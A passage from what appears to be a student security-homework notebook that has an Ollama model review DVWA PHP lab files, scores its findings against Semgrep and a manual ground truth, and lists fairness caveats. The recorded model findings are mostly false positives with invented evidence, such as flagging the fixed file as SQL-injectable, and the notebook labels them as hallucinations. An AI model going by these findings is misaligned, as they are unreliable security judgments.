You are reviewing four PHP source files from the local DVWA lab for a security homework.
Report every suspected finding in the source under these labels only: sqli, xss, cmdi, broken-access-control.
For each finding, give the exact PHP filename in location (for example sqli_medium.php) and concise evidence from the source.
Do not invent CVEs, dependencies, endpoints, or code not shown. Report exploitable injection issues in the shown files; review the fixed file as a negative control. Do not infer an access-control policy from missing application context.
Return ONLY a JSON array. Each object must have keys rule, location, severity, confidence, evidence.

SOURCE FILE: {DUEL_SOURCE_PATH.name}
```php
{DUEL_SOURCE}
```
'''

RULE_ALIASES = {
    'sql injection': 'sqli', 'sqli': 'sqli',
    'reflected xss': 'xss', 'cross-site scripting': 'xss', 'xss': 'xss',
    'command injection': 'cmdi', 'cmdi': 'cmdi',
    'broken access control': 'broken-access-control', 'access control': 'broken-access-control',
}


def parse_llm_findings(raw: str, run_name: str) -> list[ScanResult]:
    candidate = raw.strip()
    candidate = re.sub(r'^```(?:json)?\s*|\s*```$', '', candidate, flags=re.I | re.S).strip()
    if not candidate.startswith('['):
        match = re.search(r'\[.*\]', candidate, re.S)
        if match:
            candidate = match.group(0)
    try:
        reported = json.loads(candidate)
    except json.JSONDecodeError as error:
        raise RuntimeError(f'{run_name} returned non-JSON findings: {error}. Raw response is retained for review.') from error
    if not isinstance(reported, list):
        raise RuntimeError(f'{run_name} returned JSON that was not a list.')

    findings = []
    for item in reported:
        if not isinstance(item, dict):
            continue
        claimed = str(item.get('rule', '')).strip().lower()
        rule = next((canonical for alias, canonical in RULE_ALIASES.items() if alias in claimed), claimed)
        location = str(item.get('location', '')).strip().lower().replace(chr(92), '/').rsplit('/', 1)[-1] or 'unspecified'
        findings.append(ScanResult(
            rule=rule, location=location, tool=run_name,
            severity=str(item.get('severity', 'unknown')).lower(),
            confidence=str(item.get('confidence', 'model')).lower(),
            raw=json.dumps(item, ensure_ascii=False),
        ))
    return findings


def run_ollama_review(run_name: str, seed: int):
    from experiment_support import structured_reviewer
    reviewer = structured_reviewer(backend='ollama', model=OLLAMA_MODEL, cache_dir='duel/.llm_cache',
                   temperature=0.7, seed=seed, timeout=900)
    (Path.cwd() / 'duel' / 'review_prompt.txt').write_text(LLM_PROMPT, encoding='utf-8')
    (Path.cwd() / 'duel' / 'review_prompt.txt').write_text(LLM_PROMPT, encoding='utf-8')
    response = reviewer.complete(LLM_PROMPT, use_cache=False)
    (Path.cwd() / 'duel' / f'{run_name}_raw.json').write_text(
        json.dumps(response.to_dict(), indent=2, ensure_ascii=False), encoding='utf-8')
    (Path.cwd() / 'duel' / f'{run_name}_raw.json').write_text(
        json.dumps(response.to_dict(), indent=2, ensure_ascii=False), encoding='utf-8')
    if response.error:
        raise RuntimeError(f'{run_name} failed: {response.error}')
    return response, parse_llm_findings(response.text, run_name)


ollama_run_1, ollama_findings_1 = run_ollama_review('ollama-run-1', seed=11)
ollama_run_2, ollama_findings_2 = run_ollama_review('ollama-run-2', seed=29)
print('Run 1:', [finding.key() for finding in ollama_findings_1])
print('Run 2:', [finding.key() for finding in ollama_findings_2])


Run 1: [('sqli', 'sqli_fixed.php'), ('xss', 'xss_medium.php'), ('broken-access-control', 'sqli_fixed.php')]
Run 2: [('sqli', 'exec_medium.php'), ('xss', 'exec_medium.php'), ('cmdi', 'sqli_fixed.php'), ('broken-access-control', 'sqli_fixed.php')]


In [5]:
print(ollama_findings_1)

[ScanResult(rule='sqli', location='sqli_fixed.php', severity='high', tool='ollama-run-1', confidence='high', raw='{"rule": "sqli", "location": "dvwa_source/sqli_fixed.php", "severity": "high", "confidence": "high", "evidence": "php_uname is missing from the script."}'), ScanResult(rule='xss', location='xss_medium.php', severity='low', tool='ollama-run-1', confidence='high', raw='{"rule": "xss", "location": "dvwa_source/xss_medium.php", "severity": "low", "confidence": "high", "evidence": "The script includes `<?php` and `<?` tags, which are not valid in XSS protection."}'), ScanResult(rule='broken-access-control', location='sqli_fixed.php', severity='high', tool='ollama-run-1', confidence='high', raw='{"rule": "broken-access-control", "location": "dvwa_source/sqli_fixed.php", "severity": "high", "confidence": "high", "evidence": "The script contains an attempt to bypass access control using `if( isset( $_POST[ \'Submit\' ] ) )`, which is not allowed."}')]


In [6]:
print(ollama_findings_2)

[ScanResult(rule='sqli', location='exec_medium.php', severity='high', tool='ollama-run-2', confidence='low', raw='{"rule": "sqli", "location": "dvwa_source/exec_medium.php", "severity": "high", "confidence": "low", "evidence": "PHP code retrieves user information from the database via an SQL query with user IDs."}'), ScanResult(rule='xss', location='exec_medium.php', severity='high', tool='ollama-run-2', confidence='high', raw='{"rule": "xss", "location": "dvwa_source/exec_medium.php", "severity": "high", "confidence": "high", "evidence": "The code includes user IDs in the URL, which can be exploited if the user has a logged-in account. A full exploit requires access to the user\'s session data or user authentication mechanisms."}'), ScanResult(rule='cmdi', location='sqli_fixed.php', severity='low', tool='ollama-run-2', confidence='low', raw='{"rule": "cmdi", "location": "dvwa_source/sqli_fixed.php", "severity": "low", "confidence": "low", "evidence": "The code does not execute a SQL c

## PART C4 — Score scanner and LLM against ground truth

Each Ollama run is scored separately. This avoids cherry-picking the better run and makes the non-determinism visible in the same metric table.


In [7]:
findings_by_tool = {
    'semgrep': semgrep_findings,
    'ollama-run-1': ollama_findings_1,
    'ollama-run-2': ollama_findings_2,
}
comparison = compare_scanners(findings_by_tool, GROUND_TRUTH)
print_comparison(comparison)

for tool, score in comparison.items():
    print(f"{tool}: precision={score['precision']:.3f}, recall={score['recall']:.3f}, F1={score['f1']:.3f}")


  tool             TP   FP   FN    prec  recall     F1
  ----------------------------------------------------
  semgrep           2    0    1    100%     67%   0.80
  ollama-run-1      1    2    2     33%     33%   0.33
  ollama-run-2      0    4    3      0%      0%   0.00

  Read this like a security engineer, not a leaderboard:

  - HIGH RECALL, LOW PRECISION (finds everything, cries wolf): an LLM often lands
    here. Every false positive is analyst time; a tool that reports 40 bugs where
    6 are real will be ignored within a week.
  - HIGH PRECISION, LOW RECALL (quiet but misses things): a narrow ruleset often
    lands here. What it misses is what hurts you.
  - The interesting cell is the FALSE POSITIVES the LLM invented and the TRUE bugs
    the scanner MISSED. Print both and read them out loud — that comparison is the
    deliverable, not the F1 score.

  semgrep missed (real bugs it did not report):
      ('sqli', 'sqli_medium.php')

  ollama-run-1 false positives (hallucin

## PART C5 — Hallucinations, scanner misses, and non-determinism

This cell prints the evidence the written report must name: the LLM's false positives (if any), Semgrep's worst miss, how the two model runs differ, and whether either tool claimed Broken Access Control. A model claim is not deleted merely because it is wrong; the independent truth set classifies it.


In [8]:
def raw_for_key(findings: list[ScanResult], key: tuple[str, str]) -> str:
    return next((finding.raw for finding in findings if finding.key() == key), '')


for name, findings in [('ollama-run-1', ollama_findings_1), ('ollama-run-2', ollama_findings_2)]:
    false_positives = comparison[name]['false_positives']
    print(f'\n{name} false positives / hallucinations:')
    if false_positives:
        for key in false_positives:
            print(' ', key, raw_for_key(findings, key))
    else:
        print('  none in this run')

print('\nSemgrep missed real findings:', comparison['semgrep']['missed'])

keys_1 = {finding.key() for finding in ollama_findings_1}
keys_2 = {finding.key() for finding in ollama_findings_2}
union = keys_1 | keys_2
jaccard = len(keys_1 & keys_2) / len(union) if union else 1.0
print('\nLLM non-determinism:')
print('  only run 1:', sorted(keys_1 - keys_2))
print('  only run 2:', sorted(keys_2 - keys_1))
print(f'  agreement (Jaccard): {jaccard:.3f}')

for name, findings in findings_by_tool.items():
    bac_claims = [finding for finding in findings if finding.rule == 'broken-access-control']
    print(f"{name} Broken Access Control claims: {[finding.key() for finding in bac_claims] or 'none'}")
print('No separate access-control violation established in these snippets; full DVWA authentication is outside scan scope.')



ollama-run-1 false positives / hallucinations:
  ('broken-access-control', 'sqli_fixed.php') {"rule": "broken-access-control", "location": "dvwa_source/sqli_fixed.php", "severity": "high", "confidence": "high", "evidence": "The script contains an attempt to bypass access control using `if( isset( $_POST[ 'Submit' ] ) )`, which is not allowed."}
  ('sqli', 'sqli_fixed.php') {"rule": "sqli", "location": "dvwa_source/sqli_fixed.php", "severity": "high", "confidence": "high", "evidence": "php_uname is missing from the script."}

ollama-run-2 false positives / hallucinations:
  ('broken-access-control', 'sqli_fixed.php') {"rule": "broken-access-control", "location": "dvwa_source/sqli_fixed.php", "severity": "high", "confidence": "high", "evidence": "The script contains a SQL injection vulnerability in the form of an escaped string, which can be exploited to execute arbitrary SQL commands."}
  ('cmdi', 'sqli_fixed.php') {"rule": "cmdi", "location": "dvwa_source/sqli_fixed.php", "severity": 

## PART C6 — Save reproducible duel artifacts

This writes the raw local model outputs, model settings, normalized findings, scores, and a CSV metric table to `tulcan/duel/`. Commit these generated artifacts with the notebook so the reviewer can reproduce the conclusion instead of trusting a screenshot.


In [9]:
def finding_record(finding: ScanResult) -> dict:
    return {
        'rule': finding.rule, 'location': finding.location, 'severity': finding.severity,
        'tool': finding.tool, 'confidence': finding.confidence, 'raw': finding.raw,
    }


duel_dir = Path.cwd() / 'duel'
duel_dir.mkdir(exist_ok=True)
artifact = {
    'target': str(DUEL_SOURCE_PATH),
    'ground_truth_document': 'ground_truth_manual.json',
    'provenance': 'Fresh Windows run; manual review before these calls, historical results known',
    'source_files': [path.name for path in SOURCE_FILES],
    'source_sha256': hashlib.sha256(DUEL_SOURCE.encode()).hexdigest(),
    'ground_truth': sorted(GROUND_TRUTH),
    'classical_scanner': 'semgrep custom rules embedded in notebook',
    'normalization': 'rule aliases and lowercase source basename; evidence retained unchanged',
    'format_retry': 'Initial unconstrained-format responses retained in duel/format_attempt; two new structured calls scored',
    'llm': {
        'backend': 'ollama', 'model': OLLAMA_MODEL, 'temperature': 0.7, 'seeds': [11, 29],
        'run_1': ollama_run_1.to_dict(), 'run_2': ollama_run_2.to_dict(),
    },
    'findings': {name: [finding_record(finding) for finding in findings]
                 for name, findings in findings_by_tool.items()},
    'comparison': comparison,
    'non_determinism': {
        'only_run_1': sorted(keys_1 - keys_2), 'only_run_2': sorted(keys_2 - keys_1),
        'jaccard': jaccard,
    },
}
(duel_dir / 'part_c_results.json').write_text(json.dumps(artifact, indent=2, ensure_ascii=False), encoding='utf-8')

with (duel_dir / 'part_c_metrics.csv').open('w', newline='', encoding='utf-8') as handle:
    writer = csv.DictWriter(handle, fieldnames=['tool', 'tp', 'fp', 'fn', 'precision', 'recall', 'f1'])
    writer.writeheader()
    for tool, score in comparison.items():
        writer.writerow({'tool': tool, **{key: score[key] for key in writer.fieldnames if key != 'tool'}})

print('Wrote:', duel_dir / 'part_c_results.json')
print('Wrote:', duel_dir / 'part_c_metrics.csv')


Wrote: C:\Users\isabe\OneDrive\Escritorio\NOVENOSEMESTRE\CompSec\cmp-5006E-fall26\homework\hw2\tulcan\duel\part_c_results.json
Wrote: C:\Users\isabe\OneDrive\Escritorio\NOVENOSEMESTRE\CompSec\cmp-5006E-fall26\homework\hw2\tulcan\duel\part_c_metrics.csv


# Where our attack, defense, or comparison might be unfair.

1. **Reference exposure and authorship.** The original duel used instructor
   fixtures and retrospective review. The new PHP reference was manually reasoned
   with AI assistance before the new PHP tool calls, after exposure to historical
   vuln-web results. It is not blinded; group members must review it before submission.
2. **Unequal tool tuning.** Custom Semgrep rules intentionally miss SQL assembled
   in a variable. Scores describe these teaching rules, not Semgrep's standard
   security rules or a fair general ranking of models and scanners.
3. **Corpus realism.** The 26 examples mix names, usernames and hosts. Sending
   them through an ID-boundary filter measures its signatures, not whether they
   are valid numeric-ID requests. The 7.69% FP rate is not a production estimate.
   For example, `drop table tennis lessons for beginners` is legitimate search
   text, but not a legitimate ID for this form. Thus 2/26 measures false positives
   on the supplied generic corpus, not two valid DVWA lookups wrongly denied.
4. **Oracle scope.** XSS verifies raw script markup, not browser execution. SQLi
   discloses an additional seeded user row rather than the literal course canary.
   Current command tests run the real local shell effect; historical vuln-web
   command injection was simulated.
   **Least portable Part-A finding: command injection.** Its oracle expects
   `www-data` from `whoami`; a different container user, shell, or missing ping
   utility can change the response. It succeeded 3/3 in the recorded environment,
   but this is repeatability within one image, not across deployments.
5. **Fix scope.** Our PHP parameterized fix protects the chosen SQLi statement.
   It does not repair separate XSS/command endpoints or establish authorization.
   DVWA Impossible remains supplied code; SQLite remains a supplemental target.
6. **Model budget.** The new CPU experiment selects a smaller model than the
   historical 3B run. Its behavior must not be generalized to larger models.
   Comments and a recognizable teaching target can make review easier.
7. **Scoring and variability.** Findings collapse to class/filename keys, and
   duplicate database branches count once. Two samples are a small variability
   measurement, not proof of determinism. No hallucination may be invented to
   satisfy a report item; actual false positives are retained and discussed.
8. **Access-control context.** Authentication is outside the reviewed snippets.
   No observed A01 finding does not prove DVWA has no access-control weaknesses.
9. **Execution provenance.** Historical macOS outputs are preserved separately.
   Current CSVs/notebook record actual Windows-driven DVWA execution. Cached PHP
   initially invalidated a fix test; implementation markers and revalidation
   checks were added, and the final defense experiment was rerun successfully.
10. **Format retries and explanation quality.** An initial model attempt failed
    JSON parsing; both responses are retained in duel/format_attempt. Two new
    structured-output calls are scored, with the same schema for both seeds.
    Labels remain unconstrained. Even the one matching XSS finding has an
    incorrect explanation; class/file precision does not measure reasoning
    quality. The reference scores three intended findings rather than claiming
    an exhaustive audit of all possible DVWA issues.
